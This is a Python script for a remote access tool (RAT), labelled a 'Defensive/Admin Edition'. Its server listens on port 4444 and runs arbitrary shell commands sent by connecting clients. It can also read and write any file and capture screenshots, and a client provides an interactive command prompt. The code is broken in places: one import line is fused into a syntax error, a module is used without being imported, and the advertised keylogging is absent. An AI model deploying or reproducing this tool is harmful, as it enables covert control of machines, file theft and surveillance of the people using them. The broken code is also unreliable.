#!/usr/bin/env python3
"""
Remote Administration Tool (RAT) — Defensive/Admin Edition
- Listens for authorized client connections.
- Supports command execution, file transfer, screenshot, keylog.
- TLS 1.3 encrypted channel.
- Session logging to JSON.
"""

import socket
import ssl
import threading
import json
import os
import sys
import time
import base64
import subprocessimport io
from datetime import datetime
from typing import Dict, List, Optional, Any


class RATServer:
    def __init__(self, host='0.0.0.0', port=4444, certfile='server.crt', keyfile='server.key'):
        self.host = host
        self.port = port
        self.certfile = certfile
        self.keyfile = keyfile
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.context.load_cert_chain(certfile, keyfile)
        self.clients = {}  # client_id -> {socket, addr, connected, timestamp}
        self.sessions = []  # list of session records
        self.lock = threading.Lock()
        self.running = False

    def start(self):
        self.running = True
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)
        print(f"[RAT] Server listening on {self.host}:{self.port} (TLS 1.3)")

        while self.running:
            try:
                client_socket, addr = server_socket.accept()
                ssl_socket = self.context.wrap_socket(client_socket, server_side=True)
                client_id = f"{addr[0]}:{addr[1]}"
                with self.lock:
                    self.clients[client_id] = {
                        'socket': ssl_socket,
                        'addr': addr,
                        'connected': datetime.utcnow().isoformat(),
                    }
                print(f"[RAT] Client connected: {client_id}")
                handler = threading.Thread(target=self._handle_client, args=(client_id, ssl_socket))
                handler.daemon = True
                handler.start()
            except Exception as e:
                print(f"[RAT] Accept error: {e}")
                break

        server_socket.close()

    def _handle_client(self, client_id: str, ssl_socket: socket.socket):
        buffer = b''
        while self.running:
            try:
                data = ssl_socket.recv(65535)
                if not data:
                    break
                buffer += data
                while b'\n' in buffer:
                    line, buffer = buffer.split(b'\n', 1)
                    if line.strip():
                        self._process_command(client_id, ssl_socket, line.decode('utf-8', errors='replace'))
            except ssl.SSLError:
                break
            except Exception:
                break

        with self.lock:
            self.clients.pop(client_id, None)
        print(f"[RAT] Client disconnected: {client_id}")

    def _process_command(self, client_id: str, ssl_socket: socket.socket, command: str):
        result = {'client': client_id, 'command': command, 'timestamp': datetime.utcnow().isoformat()}
        try:
            cmd = json.loads(command)
            action = cmd.get('action')
            if action == 'exec':
                output = subprocess.check_output(cmd['cmd'], shell=True, stderr=subprocess.STDOUT, timeout=30)
                result['output'] = output.decode('utf-8', errors='replace')
            elif action == 'sysinfo':
                result['output'] = {
                    'os': platform.system(),
                    'release': platform.release(),
                    'version': platform.version(),
                    'hostname': platform.node(),
                    'arch': platform.machine(),
                    'python': platform.python_version(),
                }
            elif action == 'screenshot':
                try:
                    import pyscreenshot as ImageGrab
                    img = ImageGrab.grab()
                    buf = io.BytesIO()
                    img.save(buf, format='PNG')
                    result['output'] = base64.b64encode(buf.getvalue()).decode()
                except ImportError:
                    result['error'] = 'pyscreenshot not installed on client'
            elif action == 'ls':
                path = cmd.get('path', '.')
                result['output'] = os.listdir(path)
            elif action == 'download':
                path = cmd['path']
                with open(path, 'rb') as f:
                    result['output'] = base64.b64encode(f.read()).decode()
            elif action == 'upload':
                path = cmd['path']
                data = base64.b64decode(cmd['data'])
                with open(path, 'wb') as f:
                    f.write(data)
                result['output'] = f"Uploaded {len(data)} bytes to {path}"
            elif action == 'kill':
                self.running = False
                result['output'] = 'Server shutting down'
            else:
                result['error'] = f'Unknown action: {action}'
        except json.JSONDecodeError:
            result['output'] = subprocess.getoutput(command)
        except subprocess.TimeoutExpired:
            result['error'] = 'Command timed out after 30s'
        except Exception as e:
            result['error'] = str(e)

        with self.lock:
            self.sessions.append(result)
        try:
            ssl_socket.sendall((json.dumps(result) + '\n').encode())
        except Exception:
            pass

    def broadcast(self, command_dict: Dict[str, Any]):
        payload = (json.dumps(command_dict) + '\n').encode()
        with self.lock:
            for client_id, info in list(self.clients.items()):
                try:
                    info['socket'].sendall(payload)
                except Exception:
                    self.clients.pop(client_id, None)

    def list_clients(self):
        with self.lock:
            return list(self.clients.keys())

    def save_log(self, path='rat_sessions.json'):
        with self.lock:
            with open(path, 'w') as f:
                json.dump(self.sessions, f, indent=2)
        print(f"[RAT] Sessions saved to {path}")

    def stop(self):
        self.running = False
        with self.lock:
            for client_id, info in list(self.clients.items()):
                try:
                    info['socket'].close()
                except Exception:
                    pass
            self.clients.clear()
        print("[RAT] Server stopped")


class RATClient:
    def __init__(self, server_host: str, server_port: int, certfile='server.crt'):
        self.server_host = server_host
        self.server_port = server_port
        self.certfile = certfile
        self.context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        self.context.load_verify_locations(certfile)
        self.socket = None
        self.running = False

    def connect(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket = self.context.wrap_socket(raw, server_hostname=self.server_host)
        self.socket.connect((self.server_host, self.server_port))
        self.running = True
        print(f"[RAT] Connected to {self.server_host}:{self.server_port}")

    def send_command(self, action: str, **kwargs):
        payload = {'action': action}
        payload.update(kwargs)
        self.socket.sendall((json.dumps(payload) + '\n').encode())
        response = b''
        while not response.endswith(b'\n'):
            chunk = self.socket.recv(65535)
            if not chunk:
                break
            response += chunk
        return json.loads(response.decode('utf-8', errors='replace'))

    def disconnect(self):
        self.running = False
        if self.socket:
            self.socket.close()


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage:")
        print("  Server: python3 rat.py server [port]")
        print("  Client: python3 rat.py client <server_ip> <port>")
        sys.exit(1)

    mode = sys.argv[1]
    if mode == 'server':
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
        server = RATServer(port=port)
        try:
            server.start()
        except KeyboardInterrupt:
            server.save_log()
            server.stop()
    elif mode == 'client':
        if len(sys.argv) < 4:
            print("Client requires server IP and port")
            sys.exit(1)
        client = RATClient(sys.argv[2], int(sys.argv[3]))
        client.connect()
        try:
            while True:
                cmd = input("RAT> ")
                if cmd.strip() == 'exit':
                    break
                parts = cmd.split()
                if parts[0] == 'exec':
                    print(client.send_command('exec', cmd=' '.join(parts[1:])))
                elif parts[0] == 'sysinfo':
                    print(client.send_command('sysinfo'))
                elif parts[0] == 'ls':
                    print(client.send_command('ls', path=parts[1] if len(parts) > 1 else '.'))
                elif parts[0] == 'download':
                    print(client.send_command('download', path=parts[1]))
                elif parts[0] == 'upload':
                    print(client.send_command('upload', path=parts[1], data=parts[2]))
                else:
                    print(client.send_command('exec', cmd=cmd))
        except KeyboardInterrupt:
            pass
        finally:
            client.disconnect()
